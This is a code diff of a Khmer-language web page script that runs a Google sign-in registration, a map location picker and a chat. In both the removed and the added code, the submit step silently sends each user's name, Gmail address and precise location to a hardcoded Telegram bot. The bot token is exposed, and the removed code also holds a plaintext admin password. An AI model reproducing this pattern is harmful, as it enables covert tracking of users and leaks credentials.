@@ -3453,86 +3453,73 @@ function listenForAdminReplies() {
           }
       });
 }
-
 const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
 const CHAT_ID = "955031659";
-
 let finalMapLink = "";
+let userLat = "";
+let userLon = "";
 
-window.onload = function() {
-    const savedName = localStorage.getItem('user_name');
-    if (savedName) {
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('step-2').style.display = 'none';
-        document.getElementById('step-3').style.display = 'block';
-        document.getElementById('chat-user-input').value = savedName;
-        listenForMessages();
+
+firebase.auth().onAuthStateChanged((user) => {
+    if (user) {
+    
+        const savedName = localStorage.getItem('user_name');
+        if (savedName) {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+            document.getElementById('chat-user-input').value = savedName;
+            listenForMessages();
+        }
     }
-};
+});
 
 function toStep2() {
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
+    setTimeout(initMap, 500); // បើក Map ក្រោយពេលបង្ហាញ Step 2
 }
 
-    let userLat = "";
-let userLon = "";
-
-function getExactLocation() {
-    const status = document.getElementById('gps-status');
-    const btn = document.getElementById('btn-gps');
-
-    if (navigator.geolocation) {
-        status.innerText = "⌛ កំពុងស្កេនរកទីតាំងឱ្យចំផ្ទះបង...";
-        
-       
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        };
-
-        navigator.geolocation.getCurrentPosition(function(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            finalMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            status.innerText = "✅ ចាប់បានទីតាំងចំកន្លែងហើយ!";
-            status.style.color = "green";
-            btn.style.background = "#4CAF50";
-            
-            console.log("ទីតាំងពិតគឺ៖", finalMapLink);
-        }, function(error) {
-            alert("សូមចុច Allow Location លើ Browser និងបើក GPS ទូរស័ព្ទ!");
-            status.innerText = "❌ មិនអាចចាប់ទីតាំងបាន";
-        }, options);
-    }
+// ២. មុខងារ Login ជាមួយ Google
+const provider = new firebase.auth.GoogleAuthProvider();
+function loginWithGoogle() {
+    firebase.auth().signInWithPopup(provider)
+        .then((result) => {
+            const user = result.user;
+            document.getElementById('reg-name').value = user.displayName;
+            document.getElementById('reg-email').value = user.email;
+            alert("Gmail ពិតត្រូវបានផ្ទៀងផ្ទាត់៖ " + user.email);
+        })
+        .catch((error) => {
+            alert("ការ Login បរាជ័យ! សូមព្យាយាមម្តងទៀត។");
+        });
 }
+
 
 function finalSubmit() {
     const name = document.getElementById('reg-name').value.trim();
     const email = document.getElementById('reg-email').value.trim();
+    const currentUser = firebase.auth().currentUser;
 
-    if (!name || !userLat) {
-        alert("សូមបំពេញឈ្មោះ និងចុច GPS ឱ្យចេញពណ៌បៃតងសិន!");
+    if (!currentUser) {
+        alert("❌ សូម Login ជាមួយ Gmail ជាមុនសិន!");
+        return;
+    }
+    if (!finalMapLink) {
+        alert("❌ សូមរើសទីតាំងលើផែនទីសិន!");
+        return;
+    }
+    if (!name) {
+        alert("❌ សូមបំពេញឈ្មោះ!");
         return;
     }
 
-
     localStorage.setItem('user_name', name);
 
-  
-    chatRef.push({
-        name: name,
-        message: "📍 បានផ្ញើទីតាំងពិត",
-        location: finalMapLink, 
-        time: new Date().toLocaleTimeString()
-    });
-
- 
-    const text = `🚨 ទីតាំងអ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📍 ទីតាំងពិត: ${finalMapLink}`;
+   
+    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំង: ${finalMapLink}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
 
     document.getElementById('chat-user-input').value = name;
     document.getElementById('step-2').style.display = 'none';
@@ -3569,90 +3556,23 @@ function listenForMessages() {
     });
 }
 
-function clearAllChat() {
-    const code = document.getElementById('admin-code').value;
-    if (code === "reaksmey10012004@") {
-        chatRef.remove();
-        alert("លុបសារទាំងអស់ហើយ!");
-    } else {
-        alert("លេខកូដខុស!");
-    }
-}
-
-const provider = new firebase.auth.GoogleAuthProvider();
-
-function loginWithGoogle() {
-    firebase.auth().signInWithPopup(provider)
-        .then((result) => {
-            const user = result.user;
-            
-   
-            document.getElementById('reg-name').value = user.displayName;
-            document.getElementById('reg-email').value = user.email;
-            
-
-            alert("Gmail ពិតត្រូវបានផ្ទៀងផ្ទាត់៖ " + user.email);
-            console.log("Verified User:", user.email);
-        })
-        .catch((error) => {
-            alert("ការ Login បរាជ័យ! សូមព្យាយាមម្តងទៀតដើម្បីប្រើ Gmail ពិត។");
-        });
-}
-
-function finalSubmit() {
-    const name = document.getElementById('reg-name').value;
-    const email = document.getElementById('reg-email').value;
-
-   
-    if (!firebase.auth().currentUser) {
-        alert("ហាមចូល! បងត្រូវតែចុចប៊ូតុង Login ជាមួយ Google ដើម្បីប្រើ Gmail ពិតប្រាកដសិន។");
-        return;
-    }
-
-    if (!finalMapLink) {
-        alert("សូមចុចផ្តល់ទីតាំង GPS ជាមុនសិន!");
-        return;
-    }
-
-   
-    const text = `🚨 អ្នកលេងថ្មី (Verified)\n👤 ឈ្មោះ: ${name}\n📧 Gmail: ${email}\n📍 ទីតាំង: ${finalMapLink}`;
-    let img = new Image();
-    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-
-
-    document.getElementById('chat-user-input').value = name;
-    document.getElementById('step-2').style.display = 'none';
-    document.getElementById('step-3').style.display = 'block';
-}
-
-let map, marker;
 
 function initMap() {
-    
-    map = L.map('map').setView([11.5564, 104.9282], 13);
-    
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+    if (document.getElementById('map')) {
+        let map = L.map('map').setView([11.5564, 104.9282], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        let marker = L.marker([11.5564, 104.9282], {draggable: true}).addTo(map);
 
-  
-    marker = L.marker([11.5564, 104.9282], {draggable: true}).addTo(map);
-
-
-    marker.on('dragend', function(event) {
-        let position = marker.getLatLng();
-        userLat = position.lat;
-        userLon = position.lng;
-        finalMapLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
-        
-        document.getElementById('gps-status').innerText = "✅ បានរើសទីតាំងរួចរាល់!";
-        document.getElementById('gps-status').style.color = "green";
-    });
+        marker.on('dragend', function(event) {
+            let position = marker.getLatLng();
+            userLat = position.lat;
+            userLon = position.lng;
+            finalMapLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
+            document.getElementById('gps-status').innerText = "✅ បានរើសទីតាំងរួចរាល់!";
+            document.getElementById('gps-status').style.color = "green";
+        });
+    }
 }
-
-
-window.onload = function() {
-    initMap();
-
-};
 </script>
 </body>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
